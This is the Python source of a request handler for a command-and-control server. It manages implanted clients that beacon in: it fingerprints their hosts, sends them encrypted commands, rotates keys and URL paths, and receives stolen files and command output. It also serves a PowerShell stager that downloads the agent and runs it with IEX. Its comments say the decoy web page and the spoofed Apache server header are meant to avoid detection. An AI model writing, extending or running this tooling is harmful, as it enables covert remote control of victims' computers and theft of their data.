import http.server
import json
import base64
import os
import time
from datetime import datetime
import logging
from utils.client_identity import extract_system_info
from utils.path_rotation import PathRotationManager
from utils.agent_generator import generate_agent_code

# Set up module-level logger
logger = logging.getLogger(__name__)


class CryptoHelper:
    """Handles encryption and decryption operations for client communication"""
    
    def __init__(self, crypto_manager, client_manager):
        self.crypto_manager = crypto_manager
        self.client_manager = client_manager
    
    def get_client_key(self, client_id):
        """Get the appropriate encryption key for a client"""
        # Use client-specific key if available, otherwise use campaign key
        if hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys:
            return self.client_manager.client_keys[client_id]
        # Fall back to campaign-wide key
        return self.crypto_manager.key

    def encrypt(self, data, client_id=None):
        """Encrypt data using client key if available, otherwise campaign key"""
        key = self.get_client_key(client_id) if client_id else self.crypto_manager.key
        
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        # Generate a random IV
        iv = os.urandom(16)
        
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        # Add padding manually (simple PKCS7-like padding)
        block_size = 16
        padding_length = block_size - (len(data) % block_size)
        padded_data = data + bytes([padding_length]) * padding_length
        
        # Encrypt
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        encryptor = cipher.encryptor()
        ciphertext = encryptor.update(padded_data) + encryptor.finalize()
        
        # Combine IV and ciphertext and base64 encode
        return base64.b64encode(iv + ciphertext).decode('utf-8')
    
    def decrypt(self, encrypted_data, client_id=None):
        """Decrypt data using client key if available, otherwise campaign key"""
        key = self.get_client_key(client_id) if client_id else self.crypto_manager.key
        
        # Decode the base64
        encrypted_bytes = base64.b64decode(encrypted_data)
        
        # Extract the IV and ciphertext
        iv = encrypted_bytes[:16]
        ciphertext = encrypted_bytes[16:]
        
        from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
        from cryptography.hazmat.backends import default_backend
        
        cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
        decryptor = cipher.decryptor()
        padded_data = decryptor.update(ciphertext) + decryptor.finalize()
        
        # Remove padding manually
        padding_length = padded_data[-1]
        data = padded_data[:-padding_length]
        
        return data.decode('utf-8')


class ClientHelper:
    """Handles client identification, verification, and command management"""
    
    def __init__(self, client_manager, crypto_helper, server):
        self.client_manager = client_manager
        self.crypto_helper = crypto_helper
        self.server = server
    
    def identify_client(self, client_ip, headers, system_info_encrypted=None):
        """
        Identify a client based on headers and system info
        
        Returns:
            tuple: (client_id, system_info, newly_identified)
        """
        client_identifier = headers.get('X-Client-ID')
        client_rotation_id = headers.get('X-Rotation-ID')
        
        identified_client_id = None
        system_info = {}
        newly_identified = False
        
        if system_info_encrypted:
            try:
                # Decrypt the system information
                system_info_json = self.crypto_helper.crypto_manager.decrypt(system_info_encrypted)
                
                # Extract key system properties
                hostname, username, machine_guid, os_version, mac_address, system_info = extract_system_info(system_info_json)
                
                # Add IP to system info
                system_info['ip'] = client_ip
                
                # Add unique client identifier if provided
                if client_identifier:
                    system_info['client_identifier'] = client_identifier
                    
                    # Check if this client_identifier is already known
                    for existing_id, client_info in self.client_manager.get_clients_info().items():
                        if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                            identified_client_id = existing_id
                            logger.info(f"Recognized returning client with identifier {client_identifier} as {identified_client_id}")
                            break
                
                # If we identified the client by identifier, use that ID, otherwise register as new
                if not identified_client_id:
                    client_id = self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                    newly_identified = True
                else:
                    # Update the existing client information
                    client_id = identified_client_id
                    self.client_manager.add_client(
                        ip=client_ip,
                        hostname=hostname,
                        username=username,
                        machine_guid=machine_guid,
                        os_version=os_version,
                        mac_address=mac_address,
                        system_info=system_info
                    )
                
                logger.info(f"Client identified as {client_id} ({hostname}/{username})")
                
            except Exception as e:
                logger.error(f"Error processing system information: {str(e)}")
                # Fall back to IP-based identification
                client_id = client_ip
                self.client_manager.add_client(client_id)
                newly_identified = True
        else:
            # Fall back to IP-based identification for compatibility
            client_id = client_ip
            self.client_manager.add_client(client_id)
            newly_identified = True
            
        return client_id, system_info, newly_identified

    def verify_client(self, client_id, system_info):
        """
        Verify client identity using the server's client_verifier
        
        Returns:
            tuple: (is_verified, confidence, needs_key_rotation, warnings)
        """
        needs_key_rotation = False
        
        # Default values if verification is not possible
        is_verified = False
        confidence = 0
        warnings = ["Verification not performed"]
        
        # Verify client identity if verifier is available
        if hasattr(self.server, 'client_verifier') and self.server.client_verifier:
            verifier = self.server.client_verifier
            is_verified, confidence, warnings = verifier.verify_client(client_id, system_info)
            
            # Add logging for verification status
            logger.info(f"Verification result for {client_id}: verified={is_verified}, confidence={confidence}")
            
            # Update client verification status
            self.client_manager.set_verification_status(client_id, is_verified, confidence, warnings)
            
            # Check if client needs key rotation
            has_unique_key = self._has_unique_key(client_id)
            
            # Check for manual key rotation request 
            requested_key_rotation = any(
                cmd.get('command_type') == 'key_rotation' 
                for cmd in self.client_manager.get_pending_commands(client_id)
            )

            # Decide if key rotation is needed
            needs_key_rotation = (is_verified and (not has_unique_key or requested_key_rotation))
            
            if requested_key_rotation:
                logger.info(f"Manual key rotation requested for client {client_id}")
                
            if not is_verified:
                warning_str = ", ".join(warnings)
                logger.warning(f"Client {client_id} identity suspicious (confidence: {confidence:.1f}%): {warning_str}")
            
            # Register/update this client information for future reference
            verifier.register_client(client_id, system_info)
            
        return is_verified, confidence, needs_key_rotation, warnings
    
    def _has_unique_key(self, client_id):
        """Check if client has a unique encryption key"""
        if hasattr(self.client_manager, 'has_unique_key'):
            return self.client_manager.has_unique_key(client_id)
        else:
            # Fallback to direct check
            return hasattr(self.client_manager, 'client_keys') and client_id in self.client_manager.client_keys
    
    def prepare_key_rotation(self, client_id):
        """
        Prepare a key rotation command for the client
        
        Returns:
            dict: Key rotation command object
        """
        # Generate a new unique key for this client
        new_key = os.urandom(32)  # 256-bit key
        base64_key = base64.b64encode(new_key).decode('utf-8')
        
        # Store the client's unique key
        self.client_manager.set_client_key(client_id, new_key)
        
        # Create key rotation command
        key_rotation_command = {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "key_rotation",
            "args": base64_key
        }
        
        logger.info(f"Key rotation command issued for client {client_id}")
        
        return key_rotation_command
    
    def organize_commands(self, client_id, include_key_rotation=False):
        """
        Organize commands for client including key rotation if needed
        
        Args:
            client_id: Client identifier
            include_key_rotation: Whether to include key rotation command
            
        Returns:
            tuple: (commands, has_key_rotation)
        """
        commands = self.client_manager.get_pending_commands(client_id)
        has_key_rotation = False
        
        # Move any key rotation commands to the front
        for i, command in enumerate(commands):
            if command.get('command_type') == 'key_rotation':
                has_key_rotation = True
                if i > 0:  # Move to front if not already there
                    commands.insert(0, commands.pop(i))
                break
        
        # Add key rotation command if needed and not already present
        if include_key_rotation and not has_key_rotation:
            key_rotation_command = self.prepare_key_rotation(client_id)
            commands.insert(0, key_rotation_command)
            has_key_rotation = True
        
        return commands, has_key_rotation
    
    def clear_commands_after_rotation(self, client_id):
        """Clear key rotation commands but keep other commands"""
        pending_commands = self.client_manager.get_pending_commands(client_id)
        non_rotation_commands = [cmd for cmd in pending_commands if cmd.get('command_type') != 'key_rotation']
        
        # Clear all commands then add back non-rotation ones
        self.client_manager.clear_pending_commands(client_id)
        
        for cmd in non_rotation_commands:
            self.client_manager.add_command(
                client_id, 
                cmd.get('command_type'), 
                cmd.get('args')
            )


class PathRouter:
    """Manages URL path routing and rotation"""
    
    def __init__(self, path_manager):
        self.path_manager = path_manager
        self.path_mapping = {}
        self.update_path_mapping()
    
    def update_path_mapping(self):
        """Update path mapping after rotation"""
        self.path_mapping = {}
        
        # Add current paths to mapping
        current_paths = self.path_manager.get_current_paths()
        for key, path in current_paths.items():
            self.path_mapping[path] = key
        
        # Also add previous rotation's paths for graceful transition
        if self.path_manager.rotation_counter > 0:
            previous_paths = self.path_manager.get_path_by_rotation_id(self.path_manager.rotation_counter - 1)
            if previous_paths:
                for key, path in previous_paths.items():
                    if path not in self.path_mapping:  # Don't overwrite current paths
                        self.path_mapping[path] = f"previous_{key}"
    
    def check_rotation(self):
        """Check if rotation is needed and update mapping if it is"""
        if self.path_manager.check_rotation():
            self.update_path_mapping()
            return True
        return False
    
    def get_endpoint_type(self, path):
        """Get the endpoint type for a given path"""
        # Check in current and previous paths
        if path in self.path_mapping:
            return self.path_mapping[path]
        
        # If not found in current or previous paths, check older rotations
        for rotation_id in range(max(0, self.path_manager.rotation_counter - 5), self.path_manager.rotation_counter):
            paths = self.path_manager.get_path_by_rotation_id(rotation_id)
            if paths:
                for key, old_path in paths.items():
                    if old_path == path:
                        return f"old_{key}"
        
        # Not found
        return None
    
    def get_current_paths(self):
        """Get the current active paths"""
        return self.path_manager.get_current_paths()
    
    def get_rotation_info(self):
        """Get information about the current rotation state"""
        return self.path_manager.get_rotation_info()
    
    def create_path_rotation_command(self):
        """Create a command to update client with new path rotation info"""
        rotation_info = self.path_manager.get_rotation_info()
        return {
            "timestamp": datetime.now().strftime("%Y-%m-%d %H:%M:%S"),
            "command_type": "path_rotation",
            "args": json.dumps({
                "rotation_id": rotation_info["current_rotation_id"],
                "next_rotation_time": rotation_info["next_rotation_time"],
                "paths": rotation_info["current_paths"]
            })
        }


class C2RequestHandler(http.server.SimpleHTTPRequestHandler):
    """
    Custom HTTP request handler for C2 communications
    Handles client check-ins, commands, and file transfers with encryption
    Supports dynamic URL paths and client-specific key rotation after verification
    """
    
    def __init__(self, request, client_address, server, client_manager, logger, crypto_manager, campaign_name, url_paths=None):
        # Store parameters for later use
        self.client_manager = client_manager
        self.external_logger = logger  # Rename to avoid confusion with module logger
        self.crypto_manager = crypto_manager
        self.campaign_name = campaign_name
        
        # Create helper classes
        self.crypto_helper = CryptoHelper(crypto_manager, client_manager)
        self.client_helper = ClientHelper(client_manager, self.crypto_helper, server)
        
        # Set default URL paths
        self.default_paths = {
            "beacon_path": "/beacon",
            "agent_path": "/raw_agent",
            "stager_path": "/b64_stager",
            "cmd_result_path": "/command_result",
            "file_upload_path": "/file_upload"
        }
        
        # Initialize path rotation if server has it
        self._initialize_path_rotation(server, url_paths)
        
        # Check if rotation is needed
        self.path_router.check_rotation()
        
        # Initialize endpoint handlers
        self.endpoint_handlers = {
            "beacon_path": self.handle_beacon,
            "agent_path": self.send_agent_response,
            "stager_path": self.send_b64_stager_response,
            "cmd_result_path": self.handle_command_result,
            "file_upload_path": self.handle_file_upload,
            "previous_beacon_path": self.handle_beacon,
            "previous_agent_path": self.send_agent_response,
            "previous_stager_path": self.send_b64_stager_response,
            "previous_cmd_result_path": self.handle_command_result,
            "previous_file_upload_path": self.handle_file_upload,
            "old_beacon_path": lambda: self.handle_beacon(include_rotation_info=True),
            "old_agent_path": self.send_agent_response,
            "old_stager_path": self.send_b64_stager_response,
            "old_cmd_result_path": self.handle_command_result,
            "old_file_upload_path": self.handle_file_upload
        }
                
        super().__init__(request, client_address, server)

    def _initialize_path_rotation(self, server, url_paths=None):
        """Initialize path rotation manager"""
        # Update paths with custom paths if provided
        initial_paths = self.default_paths.copy()
        if url_paths:
            initial_paths.update(url_paths)
            
        # Make sure all paths start with '/'
        for key, path in initial_paths.items():
            if not path.startswith('/'):
                initial_paths[key] = '/' + path
                
        # Use existing path manager if available
        if hasattr(server, 'path_manager'):
            path_manager = server.path_manager
        else:
            # Create path rotation manager if not already on server
            campaign_folder = f"{self.campaign_name}_campaign"
            rotation_interval = getattr(server, 'path_rotation_interval', 3600)  # Default 1 hour
            path_manager = PathRotationManager(
                campaign_folder, 
                self.external_logger, 
                initial_paths=initial_paths,
                rotation_interval=rotation_interval
            )
            # Load existing state if available
            path_manager.load_state()
            # Attach to server for other handlers to use
            server.path_manager = path_manager
            
        # Create path router using the path manager
        self.path_router = PathRouter(path_manager)

    def log_message(self, format, *args):
        self.external_logger(f"{self.client_address[0]} - - [{self.log_date_time_string()}] {format % args}")

    def do_GET(self):
        """Handle GET requests for beacons, agent code, and stagers"""
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")

        # Log the request details
        self.log_message(f"Received GET request for {self.path}")

        # Check which endpoint this path maps to
        endpoint_type = self.path_router.get_endpoint_type(self.path)
        
        # Route to appropriate handler or default response
        if endpoint_type in self.endpoint_handlers:
            self.endpoint_handlers[endpoint_type]()
        else:
            self.send_default_response()
    
    def do_POST(self):
        """Handle POST requests for command results and file uploads"""
        # Check if rotation is needed
        if self.path_router.check_rotation():
            self.external_logger(f"Paths rotated during request handling")
        
        # Log the request details
        self.log_message(f"Received POST request for {self.path}")

        # Check which endpoint this path maps to
        endpoint_type = self.path_router.get_endpoint_type(self.path)
        
        # Route to appropriate handler or default response
        if endpoint_type in self.endpoint_handlers:
            self.endpoint_handlers[endpoint_type]()
        else:
            # Return a generic 200 response to avoid detection
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
    
    def send_default_response(self):
        """Send a generic response for unmatched paths"""
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        
        # Return a generic-looking webpage to avoid detection
        message = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Website</title>
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: Arial, sans-serif; margin: 0; padding: 20px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1 { color: #333; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>Welcome</h1>
                <p>This page is currently under maintenance. Please check back later.</p>
            </div>
        </body>
        </html>
        """
        self.wfile.write(message.encode("utf-8"))
    
    def handle_beacon(self, include_rotation_info=False):
        """Process check-in requests from clients"""
        ip = self.client_address[0]
        self.external_logger(f"Beacon received from {ip}")
        
        # Extract system info from headers
        system_info_encrypted = self.headers.get('X-System-Info')
        
        # Identify the client
        client_id, system_info, newly_identified = self.client_helper.identify_client(
            ip, 
            self.headers,
            system_info_encrypted
        )
        
        # Verify client if system info is available
        needs_key_rotation = False
        if system_info:
            _, _, needs_key_rotation, _ = self.client_helper.verify_client(client_id, system_info)
        
        # Organize commands for the client
        commands, has_key_rotation = self.client_helper.organize_commands(
            client_id, 
            include_key_rotation=needs_key_rotation
        )
        
        # Add path rotation command if needed
        if include_rotation_info:
            path_rotation_command = self.path_router.create_path_rotation_command()
            commands.append(path_rotation_command)
            self.external_logger(f"Sending path rotation info to client {client_id}")
        
        # Log commands being sent
        for command in commands:
            cmd_type = command['command_type']
            args = command['args'] if cmd_type != 'key_rotation' else '[REDACTED KEY]'
            self.client_manager.log_event(client_id, "Command send", f"Type: {cmd_type}, Args: {args}")
        
        # Send response to client
        self._send_beacon_response(client_id, commands, has_key_rotation)
        
        # Clear commands after successful delivery
        if has_key_rotation:
            self.client_helper.clear_commands_after_rotation(client_id)
        else:
            self.client_manager.clear_pending_commands(client_id)
    
    def _send_beacon_response(self, client_id, commands, has_key_rotation):
        """Send the encrypted response to the client beacon"""
        # Encrypt commands json before sending
        commands_json = json.dumps(commands)
        
        # Encrypt with client-specific key if available
        encrypted_commands = self.crypto_helper.encrypt(commands_json, client_id)
        
        # Send encrypted data
        self.send_response(200)
        self.send_header("Content-type", "application/json")
        
        # Add rotation info headers
        rotation_info = self.path_router.get_rotation_info()
        self.send_header("X-Rotation-ID", str(rotation_info["current_rotation_id"]))
        self.send_header("X-Next-Rotation", str(rotation_info["next_rotation_time"]))
        
        # Add key rotation flag if applicable
        if has_key_rotation:
            self.send_header("X-Key-Rotation", "true")
        
        self.end_headers()
        self.wfile.write(encrypted_commands.encode("utf-8"))

    def send_agent_response(self):
        """Send the PowerShell agent code with path rotation support"""
        # Get the key as base64
        key_base64 = self.crypto_manager.get_key_base64()
        server_address = f"{self.server.server_address[0]}:{self.server.server_address[1]}"
        
        # Get current paths and rotation info
        current_paths = self.path_router.get_current_paths()
        rotation_info = self.path_router.get_rotation_info()
        
        # Generate the agent code
        agent_code = generate_agent_code(
            key_base64, 
            server_address, 
            beacon_path=current_paths["beacon_path"],
            cmd_result_path=current_paths["cmd_result_path"],
            file_upload_path=current_paths["file_upload_path"],
            rotation_info=rotation_info
        )

        # Send response
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.send_header("X-Rotation-ID", str(rotation_info["current_rotation_id"]))
        self.end_headers()
        self.wfile.write(agent_code.encode("utf-8"))

    def send_b64_stager_response(self):
        """Send a Base64 encoded stager that will download and execute the agent"""
        # Get the current agent path
        current_paths = self.path_router.get_current_paths()
        agent_path = current_paths["agent_path"]
        
        # Create the stager code
        stager_code = f"$V=new-object net.webclient;$S=$V.DownloadString('http://{self.server.server_address[0]}:{self.server.server_address[1]}{agent_path}');IEX($S)"
        
        # Send response
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        self.send_header("Cache-Control", "max-age=3600, must-revalidate")
        self.send_header("Server", "Apache/2.4.41 (Ubuntu)")
        self.end_headers()
        self.wfile.write(stager_code.encode("utf-8"))

    def handle_command_result(self):
        """Process command results sent from clients"""
        # Get content data
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Try to identify the client
        client_id = None
        client_identifier = self.headers.get('X-Client-ID')
        
        if client_identifier:
            # Try to find the client ID from the identifier
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    client_id = cid
                    break
        
        # If client wasn't identified by identifier, try by IP
        if not client_id:
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    client_id = cid
                    break
        
        # Process the result
        try:
            # Decrypt the result data
            if client_id:
                result_data = self.crypto_helper.decrypt(encrypted_data, client_id)
            else:
                result_data = self.crypto_helper.decrypt(encrypted_data)
            
            # Process the result data
            self._process_result_data(client_id, result_data)
            
            # Send success response
            self._send_success_response()
            
        except Exception as e:
            self.external_logger(f"Error processing command result: {e}")
            self.send_response(400)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Bad Request")
    
    def _process_result_data(self, client_id, result_data):
        """Process command result data and update client history"""
        # Try to parse as JSON
        try:
            result_json = json.loads(result_data)
            if isinstance(result_json, dict) and 'timestamp' in result_json and 'result' in result_json:
                # This is a structured result with timestamp
                timestamp = result_json['timestamp']
                result = result_json['result']
                
                if client_id:
                    self.client_manager.add_command_result(client_id, timestamp, result)
                    self.external_logger(f"Result processed for client {client_id} (timestamp: {timestamp})")
                else:
                    # If no client was found, log as a generic result
                    self.external_logger(f"Result received from unknown client {self.client_address[0]}")
                    self.client_manager.log_event("Unknown", "Command Result Received", f"{result_data}")
            else:
                # Handle unstructured result
                self._handle_unstructured_result(client_id, result_data)
        except json.JSONDecodeError:
            # Not JSON, treat as plain text
            self._handle_unstructured_result(client_id, result_data)
    
    def _handle_unstructured_result(self, client_id, result_data):
        """Handle unstructured (non-JSON) command results"""
        self.external_logger(f"Unstructured result received from {client_id or self.client_address[0]}")
        
        if client_id:
            self.client_manager.log_event(client_id, "Command Result Received", result_data)
        else:
            # Try to find client by IP
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    self.client_manager.log_event(cid, "Command Result Received", result_data)
                    break
            else:
                self.client_manager.log_event("Unknown", "Command Result Received", result_data)
    
    def _send_success_response(self):
        """Send a successful response with rotation info headers"""
        self.send_response(200)
        self.send_header("Content-type", "text/plain")
        
        # Add rotation info headers
        rotation_info = self.path_router.get_rotation_info()
        self.send_header("X-Rotation-ID", str(rotation_info["current_rotation_id"]))
        self.send_header("X-Next-Rotation", str(rotation_info["next_rotation_time"]))
        
        self.end_headers()
        self.wfile.write(b"OK")  # Simple response to look more generic

    def handle_file_upload(self):
        """Process file uploads from clients"""
        # Get content data
        content_length = int(self.headers['Content-Length'])
        encrypted_data = self.rfile.read(content_length).decode('utf-8')
        
        # Try to identify the client
        client_id = None
        client_identifier = self.headers.get('X-Client-ID')
        
        if client_identifier:
            # Try to find the client ID from the identifier
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('system_info', {}).get('client_identifier') == client_identifier:
                    client_id = cid
                    break
        
        # If client wasn't identified by identifier, try by IP
        if not client_id:
            for cid, client_info in self.client_manager.get_clients_info().items():
                if client_info.get('ip') == self.client_address[0]:
                    client_id = cid
                    break
                    
        try:
            # Decrypt the file data
            if client_id:
                file_content = self.crypto_helper.decrypt(encrypted_data, client_id)
            else:
                file_content = self.crypto_helper.decrypt(encrypted_data)
            
            # Save the file
            file_path = self._save_uploaded_file(client_id, file_content)
            
            # Send success response
            self._send_success_response()
            
        except Exception as e:
            self.external_logger(f"Error handling file upload: {e}")
            self.send_response(500)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Server Error")
            
    def _save_uploaded_file(self, client_id, file_content):
        """Save uploaded file content to disk"""
        # Prepare the uploads directory
        campaign_name = self.campaign_name
        if not campaign_name:
            campaign_dirs = [d for d in os.listdir() if d.endswith("_campaign") and os.path.isdir(d)]
            if campaign_dirs:
                campaign_name = campaign_dirs[0][:-9]  # Remove "_campaign" suffix
            else:
                campaign_name = "default"
                
        campaign_folder = f"{campaign_name}_campaign"
        
        # Use client_id if available, otherwise use IP
        client_id_for_path = client_id or self.client_address[0]
        uploads_folder = os.path.join(campaign_folder, "uploads", client_id_for_path)
        os.makedirs(uploads_folder, exist_ok=True)
        
        # Try to parse as JSON for structured file upload
        try:
            file_info = json.loads(file_content)
            if isinstance(file_info, dict) and 'FileName' in file_info and 'FileContent' in file_info:
                # This is a structured file upload with filename and base64 content
                file_path = self._save_structured_file(uploads_folder, file_info, client_id)
                return file_path
            else:
                # Not a structured file upload, save as raw text
                return self._save_raw_file(uploads_folder, file_content, client_id)
        except json.JSONDecodeError:
            # Not JSON, save as raw text
            return self._save_raw_file(uploads_folder, file_content, client_id)
            
    def _save_structured_file(self, uploads_folder, file_info, client_id=None):
        """Save a structured file upload with filename and content"""
        file_name = file_info['FileName']
        file_content_base64 = file_info['FileContent']
        
        try:
            # Decode base64 content
            file_content_bytes = base64.b64decode(file_content_base64)
            
            # Save to file
            file_path = os.path.join(uploads_folder, file_name)
            with open(file_path, 'wb') as f:
                f.write(file_content_bytes)
            
            # Log the upload
            self.external_logger(f"File uploaded from {client_id or self.client_address[0]}: {file_name} ({len(file_content_bytes)} bytes)")
            if client_id:
                self.client_manager.log_event(client_id, "File Upload", f"File saved to {file_path}")
                
            return file_path
        except Exception as e:
            self.external_logger(f"Error saving structured file: {e}")
            raise
            
    def _save_raw_file(self, uploads_folder, content, client_id=None):
        """Save raw text content as a file"""
        timestamp = time.strftime("%Y%m%d-%H%M%S")
        file_path = os.path.join(uploads_folder, f"upload_{timestamp}.txt")
        
        with open(file_path, 'w') as f:
            f.write(content)
            
        self.external_logger(f"Raw text uploaded from {client_id or self.client_address[0]} and saved to {file_path}")
        if client_id:
            self.client_manager.log_event(client_id, "File Upload", f"Raw text saved to {file_path}")
            
        return file_path